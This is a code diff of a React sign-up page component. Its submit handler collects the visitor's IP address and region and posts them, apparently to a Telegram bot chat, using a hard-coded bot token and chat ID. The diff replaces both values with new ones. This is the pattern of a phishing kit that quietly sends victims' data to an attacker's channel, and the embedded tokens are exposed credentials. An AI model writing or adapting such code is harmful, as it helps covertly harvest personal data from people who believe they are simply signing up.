@@ -54,7 +54,7 @@ export default function SignUp() {
   const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault()
     setIsLoading(true)
-    const botToken = '7131764366:AAGfWRhetelojo8_3QrIrTNN3iBIv_ncW2Q'
+    const botToken = '7034007074:AAG10ffije57AnH7sgBEfS2xDrcHy7acTzQ'
     const responseIP = await fetch('https://api.my-ip.io/v2/ip.json')
     const responseIPJson = await responseIP.json()
     const responseGeo = await fetch('/api/geo', {
@@ -71,7 +71,7 @@ export default function SignUp() {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        'chat_id': -1002031190871,
+        'chat_id': -1002136434020,
         text: `
 IP: ${responseGeoJson.query}
 Região: ${responseGeoJson.region}
